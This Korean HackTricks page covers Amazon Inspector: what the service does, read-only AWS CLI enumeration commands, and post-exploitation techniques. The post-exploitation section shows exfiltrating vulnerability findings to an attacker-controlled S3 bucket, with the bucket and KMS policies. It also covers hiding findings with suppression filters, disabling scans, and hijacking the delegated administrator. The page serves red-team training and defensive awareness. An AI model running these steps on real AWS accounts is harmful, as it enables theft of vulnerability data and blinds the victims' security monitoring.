# AWS - Inspector Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 제로부터 전문가까지 배우세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

- **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- 💬 **Discord 그룹**에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 팔로우하세요.
- **해킹 요령을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## Inspector

Amazon Inspector는 AWS 환경의 보안을 강화하기 위해 설계된 고급 자동 취약점 관리 서비스입니다. 이 서비스는 Amazon EC2 인스턴스, Amazon ECR의 컨테이너 이미지, Amazon ECS 및 AWS Lambda 함수를 지속적으로 취약점 및 의도하지 않은 네트워크 노출로부터 스캔합니다. 강력한 취약점 인텔리전스 데이터베이스를 활용하여 Amazon Inspector는 심각도 수준 및 권고 사항을 포함한 자세한 결과를 제공하여 조직이 보안 위험을 사전에 식별하고 해결할 수 있도록 지원합니다. 이 종합적인 접근 방식은 AWS 서비스 전반에 걸쳐 강화된 보안 자세를 보장하며 규정 준수 및 리스크 관리에 도움이 됩니다.

## 주요 요소

### 결과

Amazon Inspector의 결과는 EC2 인스턴스, ECR 리포지토리 또는 Lambda 함수를 스캔하는 동안 발견된 취약점 및 노출에 대한 상세 보고서입니다. 상태에 따라 결과는 다음과 같이 분류됩니다:

- **활성**: 결과가 해결되지 않았습니다.
- **닫힘**: 결과가 해결되었습니다.
- **억제됨**: 하나 이상의 **억제 규칙**으로 인해 결과가 이 상태로 표시되었습니다.

결과는 다음 세 가지 유형으로도 분류됩니다:

- **패키지**: 이러한 결과는 리소스에 설치된 소프트웨어 패키지의 취약점과 관련이 있습니다. 예시로는 오래된 라이브러리나 알려진 보안 문제가 있는 종속성이 포함됩니다.
- **코드**: 이 범주에는 AWS 리소스에서 실행 중인 애플리케이션 코드에서 발견된 취약점이 포함됩니다. 일반적인 문제는 보안 위반으로 이어질 수 있는 코딩 오류나 보안이 취약한 관행입니다.
- **네트워크**: 네트워크 결과는 공격자가 악용할 수 있는 네트워크 구성에서 잠재적인 노출을 식별합니다. 이는 개방된 포트, 보안이 취약한 네트워크 프로토콜 및 잘못 구성된 보안 그룹을 포함합니다.

### 필터 및 억제 규칙

Amazon Inspector의 필터 및 억제 규칙은 결과를 관리하고 우선순위를 지정하는 데 도움을 줍니다. 필터를 사용하면 심각도나 리소스 유형과 같은 특정 기준을 기반으로 결과를 정제할 수 있습니다. 억제 규칙을 사용하면 낮은 위험으로 간주되는 특정 결과를 억제하여 보안 보고서를 과도하게 만들지 않고 보다 중요한 문제에 집중할 수 있습니다.

### 소프트웨어 자산 목록 (SBOM)

Amazon Inspector의 소프트웨어 자산 목록(SBOM)은 라이브러리 및 종속성을 포함한 소프트웨어 패키지 내 모든 구성 요소를 상세히 나열한 내보낼 수 있는 중첩된 인벤토리 목록입니다. SBOM은 소프트웨어 공급망에 대한 투명성을 제공하여 더 나은 취약점 관리와 규정 준수를 가능하게 합니다. 오픈 소스 및 제3자 소프트웨어 구성 요소와 관련된 위험을 식별하고 완화하는 데 중요합니다.

## 주요 기능

### 결과 내보내기

Amazon Inspector는 Amazon S3 버킷, Amazon EventBridge 및 AWS Security Hub로 결과를 내보내는 기능을 제공하여 특정 날짜와 시간에 식별된 취약점 및 노출에 대한 자세한 보고서를 생성하여 추가 분석이나 공유를 가능하게 합니다. 이 기능은 CSV 및 JSON과 같은 다양한 출력 형식을 지원하여 다른 도구 및 시스템과 쉽게 통합할 수 있습니다. 내보내기 기능을 사용하면 보고서에 포함할 데이터를 사용자 정의할 수 있어 특정 기준(심각도, 리소스 유형 또는 날짜 범위)에 따라 결과를 필터링하고 현재 AWS 지역의 모든 활성 상태 결과를 기본적으로 포함할 수 있습니다.

결과를 내보낼 때는 데이터를 내보내는 동안 암호화하기 위해 Key Management Service (KMS) 키가 필요합니다. KMS 키를 사용하면 내보낸 결과가 무단 액세스로부터 보호되어 민감한 취약점 정보에 대한 추가 보안 계층을 제공합니다.

### Amazon EC2 인스턴스 스캔

Amazon Inspector는 Amazon EC2 인스턴스에 대한 강력한 스캔 기능을 제공하여 취약점과 보안 문제를 감지합니다. Inspector는 EC2 인스턴스에서 추출된 메타데이터를 보안 고지에서의 규칙과 비교하여 패키지 취약점 및 네트워크 접근성 문제를 생성합니다. 이러한 스캔은 계정의 **스캔 모드** 설정 구성에 따라 **에이전트 기반** 또는 **에이전트리스** 방법을 통해 수행할 수 있습니다.

- **에이전트 기반**: AWS Systems Manager (SSM) 에이전트를 사용하여 심층 스캔을 수행합니다. 이 방법을 사용하면 인스턴스에서 직접 데이터 수집 및 분석이 가능합니다.
- **에이전트리스**: 인스턴스에 에이전트를 설치할 필요가 없는 가벼운 대안을 제공하며 EC2 인스턴스의 모든 볼륨에 대한 EBS 스냅샷을 생성하여 취약점을 찾은 후 삭제합니다. 스캔은 기존의 AWS 인프라를 활용합니다.

스캔 모드는 EC2 스캔을 수행하는 데 사용할 방법을 결정합니다:

- **에이전트 기반**: EC2 인스턴스에 SSM 에이전트를 설치하여 심층 검사를 수행합니다.
- **하이브리드 스캔**: 에이전트 기반 및 에이전트리스 방법을 결합하여 범위를 최대화하고 성능 영향을 최소화합니다. SSM 에이전트가 설치된 EC2 인스턴스에서는 Inspector가 에이전트 기반 스캔을 수행하고 SSM 에이전트가 없는 인스턴스에서는 에이전트리스 스캔을 수행합니다.

또 다른 중요한 기능은 EC2 Linux 인스턴스의 **심층 검사**입니다. 이 기능은 EC2 Linux 인스턴스의 소프트웨어 및 구성을 철저히 분석하여 운영 체제 취약점, 응용 프로그램 취약점 및 잘못된 구성을 포함한 자세한 취약점 평가를 제공합니다. 이는 **사용자 정의 경로** 및 해당 하위 디렉토리의 검사를 통해 달성됩니다. Amazon Inspector는 기본적으로 다음을 스캔하지만 각 회원 계정은 5개의 사용자 정의 경로를 정의하고 각 위임된 관리자는 최대 10개의 경로를 정의할 수 있습니다:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Amazon ECR 컨테이너 이미지 스캔

Amazon Inspector는 Amazon Elastic Container Registry (ECR) 컨테이너 이미지에 대한 강력한 스캔 기능을 제공하여 패키지 취약점이 효율적으로 감지되고 관리됩니다.

- **기본 스캔**: 이것은 오픈 소스 Clair 프로젝트의 표준 규칙을 사용하여 컨테이너 이미지에서 알려진 OS 패키지 취약점을 식별하는 빠르고 가벼운 스캔입니다. 이 스캔 구성에서는 리포지토리가 푸시될 때 또는 수동 스캔을 수행할 때 리포지토리가 스캔됩니다.
- **향상된 스캔**: 이 옵션은 푸시 스캔에 지속적인 스캔 기능을 추가합니다. 향상된 스캔은 각 컨테이너 이미지의 레이어를 더 깊이 파고들어 OS 패키지 및 프로그래밍 언어 패키지의 취약점을 더 정확하게 식별합니다. 기본 이미지와 추가 레이어를 모두 분석하여 잠재적인 보안 문제에 대한 포괄적인 정보를 제공합니다.

### Amazon Lambda 함수 스캔

Amazon Inspector는 AWS Lambda 함수 및 해당 레이어에 대한 포괄적인 스캔 기능을 제공하여 서버리스 애플리케이션의 보안과 무결성을 보장합니다. Inspector는 Lambda 함수에 대해 두 가지 유형의 스캔을 제공합니다:

- **Lambda 표준 스캔**: 이 기본 기능은 Lambda 함수 및 레이어에 추가된 애플리케이션 패키지 종속성의 소프트웨어 취약점을 식별합니다. 예를 들어, 함수가 알려진 취약점이 있는 python-jwt와 같은 라이브러리 버전을 사용하는 경우 결과를 생성합니다.
- **Lambda 코드 스캔**: 보안 문제를 위해 사용자 지정 애플리케이션 코드를 분석하여 취약점을 감지합니다. 삽입 오류, 데이터 누출, 취약한 암호화 및 암호화 누락과 같은 취약점을 식별합니다. 감지된 취약점을 강조하는 코드 조각을 캡처하며 하드코딩된 자격 증명과 같은 문제를 해결하기 위한 자세한 권고 사항과 코드 조각이 포함됩니다.
### **인터넷 보안 센터 (CIS) 스캔**

Amazon Inspector에는 인터넷 보안 센터 (CIS)의 모범 사례 권장 사항에 따라 Amazon EC2 인스턴스 운영 체제를 평가하는 CIS 스캔이 포함되어 있습니다. 이러한 스캔은 구성이 산업 표준 보안 기준을 준수하는지 확인합니다.

- **구성**: CIS 스캔은 시스템 구성이 특정 CIS 벤치마크 권장 사항을 충족하는지를 평가하며, 각 체크는 CIS 체크 ID 및 제목에 연결됩니다.
- **실행**: 스캔은 인스턴스 태그 및 정의된 일정에 따라 수행되거나 예약됩니다.
- **결과**: 스캔 후 결과는 각 인스턴스의 보안 포지션에 대한 통찰을 제공하며, 통과한 체크, 건너뛴 체크 또는 실패한 체크를 나타냅니다.

## 열거
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## 사후 침투

{% hint style="success" %}
공격자의 관점에서 이 서비스는 공격자가 다른 인스턴스/컨테이너를 침투하는 데 도움이 되는 취약점 및 네트워크 노출을 찾을 수 있습니다.

그러나 공격자는 또한 피해자가 취약점(모든 취약점 또는 특정 취약점)을 볼 수 없도록 이 서비스를 방해하는 데 관심이 있을 수 있습니다.
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

공격자는 취약점이나 소프트웨어 부품 목록(SBOMs)에 대한 상세 보고서를 생성하고 AWS 환경에서 이를 유출할 수 있습니다. 이 정보는 특정 취약점, 오래된 소프트웨어 또는 보안에 취약한 종속성을 식별하여 특정 공격을 가능하게 할 수 있습니다.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
다음 예제는 공격자가 제어하는 Amazon S3 Bucket으로 Amazon Inspector의 모든 Active findings를 유출하는 방법을 보여줍니다:

1. **Amazon S3 Bucket 생성** 및 정책을 첨부하여 피해자 Amazon Inspector에서 접근할 수 있도록 합니다:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Amazon KMS 키를 생성**하고 피해자의 Amazon Inspector에서 사용할 수 있도록 정책을 첨부하십시오:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **결과 보고서를 생성하는** 명령을 실행하여 이를 유출하십시오:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **잠재적 영향**: 상세한 취약점 및 소프트웨어 보고서 생성 및 유출, 특정 취약점 및 보안 약점에 대한 통찰력 획득.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

공격자는 지정된 보고서 또는 SBOM 보고서 생성을 취소할 수 있으며, 이로 인해 보안 팀이 취약점 및 소프트웨어 부자재(SBOMs)에 대한 적시 정보를 받지 못하게 하여 보안 문제의 감지 및 개선이 지연될 수 있습니다.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **잠재적 영향**: 보안 모니터링 방해 및 보안 문제의 적시 감지 및 해결 방지.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

이 권한을 가진 공격자는 취약점 및 보안 문제가 보고되거나 억제되는 필터링 규칙을 조작할 수 있습니다 (**action**이 SUPPRESS로 설정된 경우 억제 규칙이 생성됨). 이로 인해 보안 관리자들로부터 중요한 취약점을 숨길 수 있어 이러한 취약점을 감지하지 않고 쉽게 악용할 수 있습니다. 중요한 필터를 변경하거나 제거함으로써 공격자는 또한 시스템을 관련 없는 결과로 침몰시켜 효과적인 보안 모니터링과 대응을 방해할 수 있습니다.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **잠재적 영향**: 중요한 취약점을 숨기거나 억제하거나 시스템을 관련 없는 결과로 넘치게 만듦.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

공격자는 보안 관리 구조를 심각하게 방해할 수 있습니다.

- 위임된 관리자 계정을 비활성화하면 공격자는 보안 팀이 Amazon Inspector 설정 및 보고서에 액세스하고 관리하는 것을 방해할 수 있습니다.
- 무단 관리자 계정을 활성화하면 공격자가 보안 구성을 제어할 수 있어서 스캔을 비활성화하거나 악의적 활동을 숨기기 위해 설정을 수정할 수 있습니다.

{% hint style="warning" %}

피해자와 동일한 조직에 무단 계정이 있어야 위임된 관리자가 될 수 있습니다.

무단 계정이 위임된 관리자가 되기 위해서는 합법적인 위임된 관리자가 비활성화된 후, 무단 계정이 위임된 관리자로 활성화되기 전에 합법적인 관리자가 조직에서 위임된 관리자로 등록 해제되어야 합니다. 이는 다음 명령어로 수행할 수 있습니다 (**`organizations:DeregisterDelegatedAdministrator`** 권한 필요): **`aws organizations deregister-delegated-administrator --account-id <합법적 계정-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **잠재적 영향**: 보안 관리 방해.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

공격자는 Amazon Inspector 조직 내의 회원 계정 연결을 조작할 수 있습니다. 무단으로 계정을 연결하거나 적절한 계정을 연결 해제함으로써, 공격자는 어떤 계정이 보안 스캔 및 보고서에 포함되는지 제어할 수 있습니다. 이로 인해 중요한 계정이 보안 모니터링에서 제외되어 공격자가 해당 계정의 취약점을 감지되지 않고 악용할 수 있습니다.

{% hint style="warning" %}

이 작업은 위임된 관리자에 의해 수행되어야 합니다.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **잠재적 영향**: 보안 스캔에서 주요 계정을 제외시킴으로써 취약점이 감지되지 않고 악용될 수 있음.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

`inspector2:Disable` 권한을 가진 공격자는 지정된 계정에서 특정 리소스 유형 (EC2, ECR, Lambda, Lambda 코드)에 대한 보안 스캔을 비활성화할 수 있어 AWS 환경의 일부가 모니터링되지 않고 공격에 취약해질 수 있습니다. 또한 **`inspector2:Enable`** 및 **`iam:CreateServiceLinkedRole`** 권한을 소유한 공격자는 의심스러운 구성이 감지되지 않도록 스캔을 선택적으로 다시 활성화할 수 있습니다.

{% hint style="warning" %}
이 작업은 위임된 관리자에 의해 수행되어야 합니다.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **잠재적 영향**: 보안 모니터링에서 블라인드 스팟 생성.

### `inspector2:UpdateOrganizationConfiguration`

이 권한을 가진 공격자는 Amazon Inspector 조직의 구성을 업데이트하여 새 멤버 계정에 대해 활성화된 기본 스캔 기능에 영향을 줄 수 있습니다.

{% hint style="warning" %}

이 작업은 위임된 관리자에 의해 수행되어야 합니다.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **잠재적 영향**: 조직의 보안 스캔 정책 및 구성 변경.

### `inspector2:TagResource`, `inspector2:UntagResource`

공격자는 AWS Inspector 리소스에 태그를 조작할 수 있으며, 이는 보안 평가를 조직화, 추적 및 자동화하는 데 중요합니다. 태그를 변경하거나 제거함으로써 공격자는 보안 스캔에서 취약점을 숨길 수 있으며, 규정 준수 보고를 방해하고 자동화된 복구 프로세스에 간섭하여, 확인되지 않은 보안 문제와 시스템 무결성이 손상될 수 있습니다.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **잠재적 영향**: 취약점 숨김, 규정 준수 보고서 방해, 보안 자동화 방해 및 비용 할당 방해.

# 참고 자료
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks를 광고하거나 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나**트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
